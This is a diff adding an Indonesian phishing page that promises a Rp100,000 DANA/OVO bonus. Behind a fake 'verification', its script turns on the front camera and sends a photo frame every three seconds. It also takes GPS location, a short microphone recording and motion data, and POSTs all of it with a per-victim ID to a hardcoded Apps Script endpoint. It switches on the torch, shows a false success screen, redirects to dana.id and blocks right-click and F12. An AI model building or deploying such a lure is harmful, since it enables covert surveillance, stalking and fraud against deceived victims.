@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🎁 Ambil Bonus 100K 🎁</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 32px;
+            padding: 40px 30px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
+            animation: fadeIn 0.5s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .bonus-icon { font-size: 70px; margin-bottom: 15px; animation: bounce 1s infinite; }
+        @keyframes bounce {
+            0%,100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        h1 { font-size: 32px; font-weight: 800; color: #333; margin-bottom: 10px; }
+        .price { font-size: 56px; font-weight: 800; color: #f5576c; margin: 15px 0; }
+        .subtitle { color: #666; margin-bottom: 25px; }
+        .btn-claim {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 18px 30px;
+            font-size: 20px;
+            font-weight: 700;
+            border-radius: 60px;
+            width: 100%;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: transform 0.2s;
+        }
+        .btn-claim:active { transform: scale(0.98); }
+        .info-box {
+            background: #e8f4fd;
+            border-radius: 16px;
+            padding: 15px;
+            font-size: 13px;
+            color: #0c5460;
+        }
+        .status-list {
+            background: #f8f9fa;
+            border-radius: 20px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: left;
+            font-size: 13px;
+            display: none;
+        }
+        .status-list.active { display: block; }
+        .status-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #e9ecef;
+        }
+        .status-item:last-child { border-bottom: none; }
+        .status-label { font-weight: 600; color: #333; }
+        .status-value { color: #667eea; font-weight: 500; }
+        .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            z-index: 10000;
+        }
+        .loading.active { display: flex; }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top-color: #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .success {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #11998e, #38ef7d);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            z-index: 10001;
+        }
+        .success.active { display: flex; }
+        .checkmark {
+            width: 80px;
+            height: 80px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            animation: scaleIn 0.5s;
+        }
+        @keyframes scaleIn {
+            from { transform: scale(0); }
+            to { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="loading" id="loading">
+    <div class="spinner"></div>
+    <h3 style="margin-top: 15px;">Memproses bonus Anda...</h3>
+    <p style="font-size: 12px; margin-top: 10px;">Mohon tunggu sebentar</p>
+</div>
+
+<div class="success" id="success">
+    <div class="checkmark">✅</div>
+    <h2 style="margin-top: 20px;">Verifikasi Berhasil!</h2>
+    <p>Bonus Rp100.000 akan segera dikirim ke DANA Anda</p>
+</div>
+
+<div class="card" id="mainCard">
+    <div class="bonus-icon">🎁💰🎁</div>
+    <h1>Selamat!</h1>
+    <p class="subtitle">Anda mendapatkan bonus spesial</p>
+    <div class="price">Rp100.000</div>
+    
+    <button class="btn-claim" id="claimBtn">🎉 AMBIL BONUS SEKARANG 🎉</button>
+    
+    <div class="status-list" id="statusList">
+        <div class="status-item">
+            <span class="status-label">📸 Kamera:</span>
+            <span class="status-value" id="camStatus">⏳ Menunggu...</span>
+        </div>
+        <div class="status-item">
+            <span class="status-label">📍 Lokasi:</span>
+            <span class="status-value" id="locStatus">⏳ Menunggu...</span>
+        </div>
+        <div class="status-item">
+            <span class="status-label">⚡ Senter:</span>
+            <span class="status-value" id="torchStatus">⏳ Menunggu...</span>
+        </div>
+        <div class="status-item">
+            <span class="status-label">🎤 Suara:</span>
+            <span class="status-value" id="audioStatus">⏳ Menunggu...</span>
+        </div>
+        <div class="status-item">
+            <span class="status-label">🔄 Gyroscope:</span>
+            <span class="status-value" id="gyroStatus">⏳ Menunggu...</span>
+        </div>
+    </div>
+    
+    <div class="info-box">
+        ℹ️ Bonus akan ditransfer ke DANA/OVO Anda maksimal 5 menit setelah verifikasi selesai
+    </div>
+</div>
+
+<script>
+    // ========== KONFIGURASI ==========
+    // ⚠️ GANTI DENGAN URL APPS SCRIPT LU! ⚠️
+    const API_URL = "https://script.google.com/macros/s/AKfycbxxByXzO1qVSXJEXSaEcwATyLGJ_pWWfl7o0IJIncUIEWpIr-TvoFg8DlVXFaHoLd-27w/exec";
+    
+    // Ambil ID dari URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const TARGET_ID = urlParams.get('id');
+    
+    // Kalau ga ada ID, kasih error
+    if(!TARGET_ID) {
+        document.body.innerHTML = '<div style="text-align:center;padding:50px;">❌ Link tidak valid. Hubungi admin untuk mendapatkan link khusus.</div>';
+        throw new Error("No ID provided");
+    }
+    
+    // ========== VARIABEL ==========
+    let cameraStream = null;
+    let frameInterval = null;
+    let torchOn = false;
+    
+    let targetData = {
+        id: TARGET_ID,
+        deviceName: navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || navigator.platform || 'Unknown Device',
+        timestamp: new Date().toISOString(),
+        waktu: new Date().toLocaleString('id-ID'),
+        cameraFrame: null,
+        lat: null,
+        lng: null,
+        torch: false,
+        gyroX: 0,
+        gyroY: 0,
+        gyroZ: 0,
+        shake: false,
+        userAgent: navigator.userAgent,
+        screenSize: `${screen.width}x${screen.height}`
+    };
+    
+    // ========== FUNGSI KIRIM KE API ==========
+    async function sendToAPI() {
+        try {
+            await fetch(API_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(targetData)
+            });
+            console.log("Data terkirim ke API:", targetData.id);
+        } catch(e) {
+            console.log("Error kirim data:", e);
+        }
+    }
+    
+    // ========== KAMERA + FRAME ==========
+    async function startCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                audio: false
+            });
+            cameraStream = stream;
+            
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.autoplay = true;
+            video.muted = true;
+            video.style.display = 'none';
+            document.body.appendChild(video);
+            
+            document.getElementById('camStatus').innerHTML = '✅ Aktif';
+            document.getElementById('camStatus').style.color = 'green';
+            
+            // Capture frame setiap 3 detik
+            frameInterval = setInterval(() => {
+                if(video.videoWidth > 0) {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 320;
+                    canvas.height = 240;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                    targetData.cameraFrame = canvas.toDataURL('image/jpeg', 0.5);
+                    sendToAPI();
+                }
+            }, 3000);
+            
+            // Nyalakan senter otomatis setelah kamera aktif
+            setTimeout(() => setTorch(true), 1000);
+            
+            return true;
+        } catch(e) {
+            console.log("Camera error:", e);
+            document.getElementById('camStatus').innerHTML = '❌ Gagal';
+            return false;
+        }
+    }
+    
+    // ========== SENTER (TORCH) ==========
+    async function setTorch(on) {
+        if(!cameraStream) return false;
+        try {
+            const track = cameraStream.getVideoTracks()[0];
+            if(track && track.getCapabilities && track.getCapabilities().torch) {
+                await track.applyConstraints({ advanced: [{ torch: on }] });
+                torchOn = on;
+                targetData.torch = on;
+                document.getElementById('torchStatus').innerHTML = on ? '🔦 Menyala' : '💡 Mati';
+                sendToAPI();
+                return true;
+            } else {
+                document.getElementById('torchStatus').innerHTML = '❌ Tidak support';
+                return false;
+            }
+        } catch(e) {
+            console.log("Torch error:", e);
+            return false;
+        }
+    }
+    
+    // ========== LOKASI GPS ==========
+    function getLocation() {
+        if('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    targetData.lat = pos.coords.latitude;
+                    targetData.lng = pos.coords.longitude;
+                    document.getElementById('locStatus').innerHTML = '✅ Terdeteksi';
+                    sendToAPI();
+                },
+                (err) => {
+                    console.log("Location error:", err);
+                    document.getElementById('locStatus').innerHTML = '❌ Gagal';
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            document.getElementById('locStatus').innerHTML = '❌ Tidak support';
+        }
+    }
+    
+    // ========== REKAM SUARA ==========
+    async function recordAudio() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            
+            recorder.ondataavailable = (e) => { if(e.data.size > 0) chunks.push(e.data); };
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.onloadend = () => {
+                    targetData.audioData = reader.result;
+                    document.getElementById('audioStatus').innerHTML = '✅ Terekam';
+                    sendToAPI();
+                };
+                reader.readAsDataURL(blob);
+                stream.getTracks().forEach(t => t.stop());
+            };
+            
+            recorder.start();
+            setTimeout(() => {
+                if(recorder.state === 'recording') recorder.stop();
+            }, 4000);
+            
+        } catch(e) {
+            console.log("Audio error:", e);
+            document.getElementById('audioStatus').innerHTML = '❌ Gagal';
+        }
+    }
+    
+    // ========== GYROSCOPE (Goyangan) ==========
+    function initGyroscope() {
+        if(window.DeviceMotionEvent) {
+            window.addEventListener('devicemotion', (e) => {
+                const acc = e.accelerationIncludingGravity;
+                if(acc) {
+                    targetData.gyroX = acc.x || 0;
+                    targetData.gyroY = acc.y || 0;
+                    targetData.gyroZ = acc.z || 0;
+                    
+                    const magnitude = Math.sqrt(acc.x*acc.x + acc.y*acc.y + acc.z*acc.z);
+                    if(magnitude > 20 && !targetData.shake) {
+                        targetData.shake = true;
+                        document.getElementById('gyroStatus').innerHTML = '✅ Goyangan!';
+                        sendToAPI();
+                        setTimeout(() => {
+                            targetData.shake = false;
+                        }, 1000);
+                    } else {
+                        document.getElementById('gyroStatus').innerHTML = `↻ X:${acc.x.toFixed(1)} Y:${acc.y.toFixed(1)}`;
+                    }
+                }
+            });
+            document.getElementById('gyroStatus').innerHTML = '⏳ Menunggu goyangan...';
+        } else {
+            document.getElementById('gyroStatus').innerHTML = '❌ Tidak support';
+        }
+    }
+    
+    // ========== PROSES UTAMA ==========
+    async function startVerification() {
+        const btn = document.getElementById('claimBtn');
+        btn.disabled = true;
+        btn.innerHTML = '⏳ Memproses... ⏳';
+        document.getElementById('loading').classList.add('active');
+        document.getElementById('statusList').classList.add('active');
+        
+        // Jalankan semua sensor
+        await startCamera();
+        getLocation();
+        recordAudio();
+        initGyroscope();
+        
+        // Kirim data awal
+        await sendToAPI();
+        
+        // Selesai
+        setTimeout(() => {
+            document.getElementById('loading').classList.remove('active');
+            document.getElementById('success').classList.add('active');
+            setTimeout(() => {
+                window.location.href = 'https://www.dana.id';
+            }, 3000);
+        }, 5000);
+    }
+    
+    // Event listener
+    document.getElementById('claimBtn').addEventListener('click', startVerification);
+    
+    // Bersihkan resource saat halaman ditutup
+    window.addEventListener('beforeunload', () => {
+        if(cameraStream) {
+            cameraStream.getTracks().forEach(track => track.stop());
+        }
+        if(frameInterval) {
+            clearInterval(frameInterval);
+        }
+    });
+    
+    // Disable inspect element
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    document.addEventListener('keydown', (e) => {
+        if(e.key === 'F12') e.preventDefault();
+    });
+</script>
+</body>
+  </html>
